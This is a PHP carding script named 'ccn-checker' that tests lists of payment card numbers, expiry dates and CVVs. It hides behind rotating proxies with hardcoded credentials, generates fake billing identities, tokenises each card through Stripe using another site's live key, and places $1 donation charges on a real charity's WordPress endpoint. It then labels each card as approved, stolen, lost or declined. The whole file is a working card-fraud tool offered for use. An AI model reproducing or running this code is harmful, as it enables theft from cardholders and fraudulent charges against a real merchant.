# ccn-checker
<?php

//Base edited by @HarryIsReborn0p
//=============================================[https://www.nyintergroup.org/quick-contribute/]==========================================//
error_reporting(0);
set_time_limit(0);
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');


function multiexplode($delimiters, $string)
{
  $one = str_replace($delimiters, $delimiters[0], $string);
  $two = explode($delimiters[0], $one);
  return $two;
}
$lista = $_GET['lista'];
$cc = multiexplode(array(":", "|", ""), $lista)[0];
$mes = multiexplode(array(":", "|", ""), $lista)[1];
$ano = multiexplode(array(":", "|", ""), $lista)[2];
$cvv = multiexplode(array(":", "|", ""), $lista)[3];

function GetStr($string, $start, $end)
{
  $str = explode($start, $string);
  $str = explode($end, $str[1]);
  return $str[0];
}
function proxy()
{
  $poxySocks = file("proxy.txt");
  $myproxy = rand(0, sizeof($poxySocks) - 1);
  $poxySocks = $poxySocks[$myproxy];
  return $poxySocks;
}
$poxySocks4 = proxy();

//////////////////////==============[Init Proxy Section]===============//////////////////////////////


$Websharegay = rand(0,10);

$rp1 = array(
  1 => 'tfmpitfq-rotate:3ommbboaq61f',
  2 => 'tfmpitfq-'.$Websharegay.':3ommbboaq61f',
    ); 
    $rpt = array_rand($rp1);
    $rotate = $rp1[$rpt];


$ip = array(
  1 => 'socks5://p.webshare.io:1080',
  2 => 'http://p.webshare.io:80',
    ); 
    $socks = array_rand($ip);
    $socks5 = $ip[$socks];


////////////////////////////==============[Proxy Section]===============//////////////////////////////

$url = "https://api.ipify.org/";   

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
$ip1 = curl_exec($ch);
curl_close($ch);
ob_flush();   
if (isset($ip1)){
//$ip = $ip1;
$ip = "Proxy live";
}
if (empty($ip1)){
$ip = "Proxy Dead:[".$rotate."]";
}


///////////////////////==============[End Proxy Section]===============//////////////////////////////


////////////////////////////===[Randomizing Details Api]

$get = file_get_contents('https://randomuser.me/api/1.2/?nat=us');
preg_match_all("(\"first\":\"(.*)\")siU", $get, $matches1);
$name = $matches1[1][0];
preg_match_all("(\"last\":\"(.*)\")siU", $get, $matches1);
$last = $matches1[1][0];
preg_match_all("(\"email\":\"(.*)\")siU", $get, $matches1);
$email = $matches1[1][0];
preg_match_all("(\"street\":\"(.*)\")siU", $get, $matches1);
$street = $matches1[1][0];
preg_match_all("(\"city\":\"(.*)\")siU", $get, $matches1);
$city = $matches1[1][0];
preg_match_all("(\"state\":\"(.*)\")siU", $get, $matches1);
$state = $matches1[1][0];
preg_match_all("(\"phone\":\"(.*)\")siU", $get, $matches1);
$phone = $matches1[1][0];
preg_match_all("(\"postcode\":(.*),\")siU", $get, $matches1);
$postcode = $matches1[1][0];




$username = 'quoyxhxl-rotate';
$password = 'im5ub9vhnxog';
$port = 80;
$session = mt_rand();
$super_proxy = 'p.webshare.io';
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 0);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST,'GET');
curl_setopt ($ch, CURLOPT_HEADER, 1);
curl_exec ($ch); 
$curl_scraped_page = curl_exec($ch);
curl_close($ch);

echo $curl_scraped_page;


///////////////=[1st REQ]=/////////////////

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'authority: api.stripe.com';
$headers[] = 'method: POST';
$headers[] = 'path: /v1/payment_methods';
$headers[] = 'scheme: https';
$headers[] = 'accept: application/json';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'content-type: application/x-www-form-urlencoded';
$headers[] = 'origin: https://js.stripe.com';
$headers[] = 'referer: https://js.stripe.com/';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-site: same-site';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.99 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[email]='.$email.'&billing_details[address][postal_code]='.$postcode.'&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=32d2baf8-248f-4549-a569-2123b0d3dabeee3b2e&muid=f7c93eaf-d5d3-4cbf-88d2-8b715c2db9e09ca911&sid=3c50b7fb-7fc0-42f7-b5f8-b69795ce1c6b3be301&pasted_fields=number&payment_user_agent=stripe.js%2F96835f1f%3B+stripe-js-v3%2F96835f1f&time_on_page=25872&referrer=https%3A%2F%2Fwww.optiparkindy.com%2F&key=pk_live_WLaietwK4F6nEnSXk9QCjfzI');
$result1 = curl_exec($ch);
$src = trim(strip_tags(getStr($result1,'"id": "','"')));

//////////////=[2nd Req]=//////////////////

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'authority: api.stripe.com';
$headers[] = 'method: POST';
$headers[] = 'path: /v1/tokens';
$headers[] = 'scheme: https';
$headers[] = 'accept: application/json';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'content-type: application/x-www-form-urlencoded';
$headers[] = 'origin: https://js.stripe.com';
$headers[] = 'referer: https://js.stripe.com/';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-site: same-site';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.99 Safari/537.36';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&card[address_zip]='.$postcode.'&guid=32d2baf8-248f-4549-a569-2123b0d3dabeee3b2e&muid=f7c93eaf-d5d3-4cbf-88d2-8b715c2db9e09ca911&sid=3c50b7fb-7fc0-42f7-b5f8-b69795ce1c6b3be301&payment_user_agent=stripe.js%2F96835f1f%3B+stripe-js-v3%2F96835f1f&time_on_page=27568&referrer=https%3A%2F%2Fwww.optiparkindy.com%2F&key=pk_live_WLaietwK4F6nEnSXk9QCjfzI&pasted_fields=number');
$result2 = curl_exec($ch);
$message = trim(strip_tags(getstr($result2,'"message":"','"')));
$token = trim(strip_tags(getstr($result2,'"id": "','"')));

/////////////////=[3Req]=//////////////////

$ch = curl_init();
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
curl_setopt($ch, CURLOPT_URL, 'https://www.optiparkindy.com/wp-admin/admin-ajax.php');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_POST, 1);
$headers = array();
$headers[] = 'authority: www.optiparkindy.com';
$headers[] = 'method: POST';
$headers[] = 'path: /wp-admin/admin-ajax.php';
$headers[] = 'scheme: https';
$headers[] = 'accept: */*';
$headers[] = 'accept-language: en-US,en;q=0.9';
$headers[] = 'content-type: application/x-www-form-urlencoded; charset=UTF-8';
$headers[] = 'cookie: __stripe_mid=f7c93eaf-d5d3-4cbf-88d2-8b715c2db9e09ca911; __stripe_sid=3c50b7fb-7fc0-42f7-b5f8-b69795ce1c6b3be301';
$headers[] = 'origin: https://www.optiparkindy.com';
$headers[] = 'referer: https://www.optiparkindy.com/donate/';
$headers[] = 'sec-fetch-dest: empty';
$headers[] = 'sec-fetch-mode: cors';
$headers[] = 'sec-fetch-site: same-origin';
$headers[] = 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.99 Safari/537.36';
$headers[] = 'x-requested-with: XMLHttpRequest';
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'action=ds_process_button&stripeToken='.$token.'&paymentMethodID='.$id.'&allData%5BbillingDetails%5D%5Bemail%5D='.$email.'&type=donation&amount=1&params%5Bvalue%5D=ds-1540813605391&params%5Bname%5D=Opti-Park&params%5Bamount%5D=MTAwMA%3D%3D&params%5Boriginal_amount%5D=1&params%5Bdescription%5D=Description&params%5Bpanellabel%5D=Confirm+payment&params%5Btype%5D=donation&params%5Bcoupon%5D=&params%5Bsetup_fee%5D=&params%5Bzero_decimal%5D=&params%5Bcapture%5D=1&params%5Bdisplay_amount%5D=1&params%5Bcurrency%5D=USD&params%5Blocale%5D=&params%5Bsuccess_query%5D=&params%5Berror_query%5D=&params%5Bsuccess_url%5D=&params%5Berror_url%5D=&params%5Bbutton_id%5D=DonateButton&params%5Bcustom_role%5D=&params%5Bbilling%5D=&params%5Bshipping%5D=&params%5Brememberme%5D=&params%5Bkey%5D=pk_live_WLaietwK4F6nEnSXk9QCjfzI&params%5Bcurrent_email_address%5D=&params%5Bajaxurl%5D=https%3A%2F%2Fwww.optiparkindy.com%2Fwp-admin%2Fadmin-ajax.php&params%5Bimage%5D=https%3A%2F%2Fwww.optiparkindy.com%2Fwp-content%2Fuploads%2F2018%2F01%2FOpti-Club-New-Logo-brightgreen-drop.png&params%5Binstance%5D=ds1540813605391&params%5Bds_nonce%5D=328bf54bcc&ds_nonce=328bf54bcc');
$result3 = curl_exec($ch);
$message = trim(strip_tags(getstr($result3,'"message":"','"')));
 
/////////// [Bin Lookup Api] /////////////

$cctwo = substr("$cc", 0, 6);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cctwo.'');
curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$fim = json_decode($fim,true);
$bank = $fim['bank']['name'];
$country = $fim['country']['alpha2'];
$type = $fim['type'];
//$base= $HarryIsReborn0p

if(strpos($fim, '"type":"credit"') !== false) {
  $type = 'Credit';
} else {
  $type = 'Debit';
}



//////depending upon  request reponse you have to use that message in results
//// like some sites cards decline in 1st reponse  so result1= message
/// some sites sometimes gives incorrect cvc in 2nd and 3rd response so i use both result2 and result 3 = incorrect cvc = ccn
 /// and sometimes 2nd reposponse gives cvc_checked= pass but decline in 3rd response .. result2= cvv if cvc_check = pass
      
      
/////////////////[Responses]///////////////
if(strpos($result3, 'Payment Successful' )) {
    echo '<span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Aprovadas</span> ◈ </span> </span> <span class="badge badge-white">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「Approved (͏CVV) Shaikh Rameez  」</span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2,'"cvc_check":"pass",')){
    echo '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Aprovadas</span> ◈ </span> </span> <span class="badge badge-white">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「Approved (͏CVV)_ Shaikh Rameez  」</span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, "Thank You For Donation." )) {
    echo '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Aprovadas</span> ◈ </span> </span> <span class="badge badge-white">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「Approved (͏CVV) Shaikh Rameez  </span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, "Thank You." )) {
    echo '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Aprovadas</span> ◈ </span> </span> <span class="badge badge-white">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「Approved (͏CVV) Shaikh Rameez  </span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3,'"status": "succeeded"')){
    echo '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Aprovadas</span> ◈ </span> </span> <span class="badge badge-white">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「Approved (͏CVV)_ Shaikh Rameez  」</span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, 'Your card zip code is incorrect.' )) {
    echo '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Aprovadas</span> ◈ </span> </span> <span class="badge badge-white">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「Approved (͏CVV - Incorrect Zip)_ Shaikh Rameez  </span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, "the zip code you supplied failed validation" )) {
    echo '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Aprovadas</span> ◈ </span> </span> <span class="badge badge-white">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「Approved (͏CVV - Incorrect Zip_ Shaikh Rameez  )」</span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, "Success" )) {
    echo '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Aprovadas</span> ◈ </span> </span> <span class="badge badge-white">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「Approved (͏CVV)_ Shaikh Rameez  」</span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, "succeeded." )) {
    echo '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Aprovadas</span> ◈ </span> </span> <span class="badge badge-white">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「Approved (͏CVV)_ Shaikh Rameez  」</span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2,"fraudulent")){
    echo '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Aprovadas</span> ◈ </span> </span> <span class="badge badge-white">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「Fraudulent Card_ Shaikh Rameez  」</span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result,"fraudulent")){
    echo '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Aprovadas</span> ◈ </span> </span> <span class="badge badge-white">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「Fraudulent Card_ Shaikh Rameez  」</span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, 'Your card has insufficient funds.')) {
    echo '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Aprovadas</span> ◈ </span> </span> <span class="badge badge-white">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「Insufficient Funds_ Shaikh Rameez  」</span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, "insufficient_funds")) {
    echo '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Aprovadas</span> ◈ </span> </span> <span class="badge badge-white">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「Insufficient Funds_ Shaikh Rameez  」</span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, "lost_card" )) {
    echo '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Aprovadas</span> ◈ </span> </span> <span class="badge badge-white">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「Lost Card_ Shaikh Rameez  」</span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, "stolen_card" )) {
    echo '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Aprovadas</span> ◈ </span> </span> <span class="badge badge-white">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「Stolen Card_ Shaikh Rameez  」</span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2, 'security code is incorrect.' )) {
    echo '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Aprovadas</span> ◈ </span> </span> <span class="badge badge-white">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「Approved (CCN)_ Shaikh Rameez  」</span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
    }
elseif(strpos($result3, "Your card's security code is incorrect." )) {
    echo '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Aprovadas</span> ◈ </span> </span> <span class="badge badge-white">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「Approved (CCN)_ Shaikh Rameez  」</span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
     }
elseif(strpos($result2, "Your card's security code is incorrect." )) {
    echo '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Aprovadas</span> ◈ </span> </span> <span class="badge badge-white">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「Approved (CCN)_ Shaikh Rameez  」</span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2, 'security code is invalid.' )) {
    echo '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Aprovadas</span> ◈ </span> </span> <span class="badge badge-white">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「Approved (CCN)_ Shaikh Rameez  」</span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2, "incorrect_cvc" )) {
    echo '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Aprovadas</span> ◈ </span> </span> <span class="badge badge-white">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「Approved (CCN)_ Shaikh Rameez  」</span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2, "pickup_card" )) {
    echo '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Aprovadas</span> ◈ </span> </span> <span class="badge badge-white">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「Pickup Card (Reported Stolen Or Lost)_ Shaikh Rameez  」</span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2, 'Your card has expired.')) {
    echo '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Reprovadas</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「Expired Card_ Shaikh Rameez  」</span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2, "expired_card" )) {
    echo '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Reprovadas</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「Expired Card_ Shaikh Rameez  </span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, "incorrect_cvc" )) {
    echo '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Aprovadas</span> ◈ </span> </span> <span class="badge badge-white">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「Approved  Shaikh Rameez  」</span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, "pickup_card" )) {
    echo '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Aprovadas</span> ◈ </span> </span> <span class="badge badge-white">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「Pickup Card (Reported Stolen Or Lost)_ Shaikh Rameez  」</span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, 'Your card has expired.')) {
    echo '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Reprovadas</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「Expired Card_ Shaikh Rameez  」</span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result3, "expired_card" )) {
    echo '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Reprovadas</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「Expired Card_ Shaikh Rameez  」</span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
    }
elseif(strpos($result2, 'Your card number is incorrect.')) {
    echo '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Reprovadas</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「Incorrect Card Number_ Shaikh Rameez  」</span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2, "incorrect_number")) {
    echo '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Reprovadas</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「Incorrect Card Number_ Shaikh Rameez  」</span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}

elseif(strpos($result1, "do_not_honor")) {
    echo '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Reprovadas</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「Declined : Do_Not_Honor_ Shaikh Rameez  」</span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result1, 'Your card was declined.')) {
    echo '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Reprovadas</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「Card Declined_ Shaikh Rameez  」</span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2, 'Your card was declined.')) {
    echo '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Reprovadas</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「Card Declined_ Shaikh Rameez  」</span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
    }
elseif(strpos($result3, 'Your card was declined.')) {
    echo '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Reprovadas</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「Card Declined_ Shaikh Rameez  」</span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}

elseif(strpos($result2, "generic_decline")) {
    echo '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Reprovadas</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「Declined : Generic_Decline_ Shaikh Rameez  」</span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2,'"cvc_check": "unavailable"')){
    echo '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Reprovadas</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「CVC_Check : Unavailable_ Shaikh Rameez  」</span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}

elseif(strpos($result2,'"cvc_check": "fail"')){
    echo '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Reprovadas</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「CVC_Unchecked : Fail_ Shaikh Rameez  」</span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2,"parameter_invalid_empty")){
    echo '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-danger">「Declined」</span> ◈ </span> </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「Declined : Missing Card Details_ Shaikh Rameez  」</span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}

elseif (strpos($result2,'Your card does not support this type of purchase.')) {
    echo '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Reprovadas</span> ◈ </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「Card Doesnt Support Purchase_ Shaikh Rameez  」 </span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
elseif(strpos($result2,"transaction_not_allowed")){
    echo '<br> <span class="badge badge-info">「 IP: '.$ip.' 」</span> ◈ </span> <span class="badge badge-blue">Reprovadas</span> ◈ </span> <span class="badge badge-danger">'.$lista.'</span> ◈ <span class="badge badge-blue"> 「Card Doesnt Support Purchase Shaikh Rameez  」 </span> ◈</span> <span class="badge badge-white"> 「 '.$bank.' ('.$country.') - '.$type.' 」 </span> </br>';
}
